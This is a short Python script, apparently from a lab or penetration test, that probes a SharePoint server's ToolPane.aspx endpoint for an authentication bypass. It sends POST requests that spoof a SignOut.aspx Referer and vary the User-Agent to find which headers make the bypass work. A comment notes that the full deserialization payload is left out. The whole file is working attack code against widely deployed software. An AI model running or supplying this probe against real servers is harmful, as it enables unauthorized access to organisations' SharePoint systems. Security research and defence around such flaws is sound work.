# Test script to check various authentication bypass techniques
# Purpose: Identify which headers/parameters are critical for auth bypass

import requests
from urllib.parse import quote

base_url = "http://10.10.10.166"
target_url = f"{base_url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx"

# Simple test body (not the full deserialization payload)
test_body = "MSOTlPn_DWP=test&MSOTlPn_Uri=http%3A%2F%2Fsharepoint%2F_controltemplates/15/AclEditor.ascx"

variants = [
    {
        "name": "Original Mobile UA + SignOut Referer",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/SignOut.aspx"
        }
    },
    {
        "name": "Desktop UA + SignOut Referer",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "/_layouts/SignOut.aspx"
        }
    },
    {
        "name": "Mobile UA + No Referer",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
        }
    },
    {
        "name": "Mobile UA + Different Referer",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/Authenticate.aspx"
        }
    },
    {
        "name": "No UA + SignOut Referer",
        "headers": {
            "Referer": "/_layouts/SignOut.aspx"
        }
    }
]

for variant in variants:
    print(f"\n[*] Testing: {variant['name']}")
    headers = variant['headers'].copy()
    headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
    
    try:
        response = requests.post(target_url, headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        print(f"    Response: {response.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
